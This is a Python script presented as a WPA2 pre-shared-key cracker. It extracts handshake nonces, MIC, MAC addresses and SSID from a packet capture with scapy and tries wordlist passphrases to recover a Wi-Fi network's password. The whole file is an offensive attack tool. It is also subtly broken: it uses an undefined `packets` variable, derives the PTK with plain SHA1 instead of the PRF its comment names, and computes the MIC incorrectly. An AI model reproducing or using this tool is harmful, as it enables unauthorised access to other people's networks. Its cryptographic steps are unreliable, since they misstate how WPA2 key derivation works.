import sys
import hashlib
import hmac
import pbkdf2
import itertools
from scapy.all import *
from hashlib import sha1
from binascii import unhexlify
import argparse

# Extract MIC, SNonce, ANonce, SSID, STA MAC, BSSID from the pcap file
def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)

    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            # Check if it's a Key (Message 2 of 4)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                if not snonce:
                    snonce = eapol_layer.key_nonce

            # Check if it's a Key (Message 3 of 4) to extract ANonce
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce

            # Extract STA MAC and BSSID
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1

            # Break the loop if all values are found
            if mic and snonce and sta_mac and bssid and anonce:
                break

        # Extract SSID from Beacon packets
        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()

    return mic, snonce, anonce, sta_mac, bssid, ssid

# PBKDF2 to generate the PMK from the PSK and SSID
def generate_pmk(psk, ssid):
    # Use PBKDF2 to generate PMK from the PSK and SSID
    psk_bytes = psk.encode('utf-8')
    ssid_bytes = ssid.encode('utf-8')
    pmk = pbkdf2.PBKDF2(psk_bytes, ssid_bytes, 4096, 32).read(32)  # 256 bits
    return pmk

# Derive PTK from PMK, ANonce, SNonce, STA MAC, and BSSID
def derive_ptk(pmk, anonce, snonce, sta_mac, bssid):
    # PTK = PRF-512(PMK || ANonce || SNonce || BSSID || STA MAC)
    ptk_input = pmk + anonce + snonce + bssid + sta_mac
    ptk = hashlib.sha1(ptk_input).digest()  # PTK should be 512 bits
    return ptk[:32]  # We only need the first 256 bits for MIC

# Compute MIC (Message Integrity Code) for a given packet
def compute_mic(ptk, packet):
    # Extract the key data from the packet
    eapol_layer = packet.getlayer(EAPOL)
    mic_computed = hmac.new(ptk, eapol_layer.load, hashlib.sha1).digest()[:16]  # MIC is 16 bytes
    return mic_computed

# Main cracking function
def crack_psk(capture_file, wordlist_file):
    # Extract the required information from the capture file
    mic, snonce, anonce, sta_mac, bssid, ssid = extract_mic_and_nonce_and_ssid(capture_file)

    if not mic or not snonce or not anonce or not sta_mac or not bssid or not ssid:
        print("Failed to extract necessary data from the capture file.")
        return

    # Try each word in the wordlist
    with open(wordlist_file, 'r') as wordlist:
        for psk in wordlist:
            psk = psk.strip()  # Remove newline and extra spaces
            pmk = generate_pmk(psk, ssid)  # Generate PMK from PSK and SSID
            ptk = derive_ptk(pmk, anonce, snonce, sta_mac, bssid)  # Derive PTK

            # Check if the computed MIC matches the captured MIC
            if compute_mic(ptk, packets[1]) == mic:  # Compare with Message 2 (index 1 of the capture)
                print(f"PSK Found: {psk}")
                break
        else:
            print("PSK not found in the wordlist.")

# Command-line interface using argparse
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="WPA2 PSK Cracker")
    parser.add_argument('capture_file', type=str, help="Path to the .cap/.pcap capture file")
    parser.add_argument('wordlist_file', type=str, help="Path to the wordlist file")
    args = parser.parse_args()

    crack_psk(args.capture_file, args.wordlist_file)
